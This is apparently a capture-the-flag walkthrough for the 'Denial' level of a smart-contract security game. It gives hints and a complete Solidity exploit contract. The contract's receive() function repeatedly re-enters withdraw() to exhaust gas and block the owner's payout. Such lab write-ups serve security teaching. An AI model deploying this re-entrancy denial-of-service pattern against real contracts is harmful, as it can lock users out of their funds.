# 20 - Denial

### Hints

<details>

<summary>Hint One</summary>

You will need to use your own contract as the “withdraw partner” to solve this challenge. This is because you will need to react to the `Denial` contract’s sending of ether in the `partner.call{value:amountToSend}("");` line. Much like a re-entrancy exploit…

</details>

<details>

<summary>Hint Two</summary>

Comments in the `Denial` contract state that your partner contract can revert and the owner will still get their share. Other than reverting, what other potentially disruptive actions could it perform?

</details>

### Scripted Solution

```solidity
// SPDX-License-Identifier: MIT

pragma solidity 0.8.7;

interface IDenial {
    function setWithdrawPartner(address _partner) external;

    function withdraw() external;
}

contract DenialExploit {
    IDenial private _denialContract;

    /**
     * Constructor sets `Denial` contract and adds itself as a 'withdraw
     * partner'.
     */
    constructor(address denialContractAddress) {
        _denialContract = IDenial(denialContractAddress);

        _denialContract.setWithdrawPartner(address(this));
    }

    receive() external payable {
        _denialContract.withdraw();
    }
}
```
